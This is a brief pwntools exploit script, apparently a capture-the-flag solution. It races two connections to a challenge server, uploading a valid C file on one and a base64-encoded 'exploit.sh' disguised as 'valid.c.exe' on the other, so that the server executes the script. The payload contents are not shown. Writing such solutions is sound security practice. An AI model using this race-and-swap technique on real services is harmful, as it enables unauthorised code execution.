import base64
from pwn import *

io0 = remote("0.cloud.chals.io", "10840")
io1 = remote("0.cloud.chals.io", "10840")
# io0 = process(["python", "server.py"])
# io1 = process(["python", "server.py"])

valid = base64.b64encode(open("primes.c", "rb").read())
exploit = base64.b64encode(open("exploit.sh", "rb").read())

io0.recvuntil(b"filename:")
io0.sendline(b"valid.c")
io0.recvuntil(b"(base64):")

io1.recvuntil(b"filename:")
io1.sendline(b"valid.c.exe")
io1.recvuntil(b"(base64):")

io0.sendline(valid)
io0.recvuntil(b"Running")
io1.sendline(exploit)
# io1.interactive()

io0.interactive()
